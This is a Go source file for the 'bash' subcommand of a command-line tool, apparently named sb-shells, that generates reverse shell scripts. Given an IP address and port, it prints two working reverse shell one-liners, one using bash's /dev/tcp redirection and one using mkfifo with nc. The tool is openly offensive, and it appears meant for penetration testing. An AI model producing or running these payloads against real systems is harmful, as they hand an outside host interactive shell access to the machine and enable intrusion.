package cmd

import (
	"fmt"

	"github.com/secopsbear/sb-shells/colors"
	"github.com/spf13/cobra"
)

// bashCmd represents the bash command
var bashCmd = &cobra.Command{
	Use:   "bash",
	Short: "Generate bash reverse shell scripts",
	Long:  `Generate bash reverse shell scripts.`,
	Run: func(cmd *cobra.Command, args []string) {

		validateIpAndPorts(cmd, args)

		bashScript := `bash -i >& /dev/tcp/` + ipAddressLocal + `/` + portLocal + ` 0>&1`

		fmt.Println(colors.CyanColor("bash reverse shell: basic "))
		fmt.Println(bashScript)

		bashScript = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ` + ipAddressLocal + ` ` + portLocal + ` >/tmp/f `

		fmt.Println(colors.CyanColor("bash reverse shell: mkfifo, nc "))
		fmt.Println(bashScript)

	},
}

func init() {
	rootCmd.AddCommand(bashCmd)
}
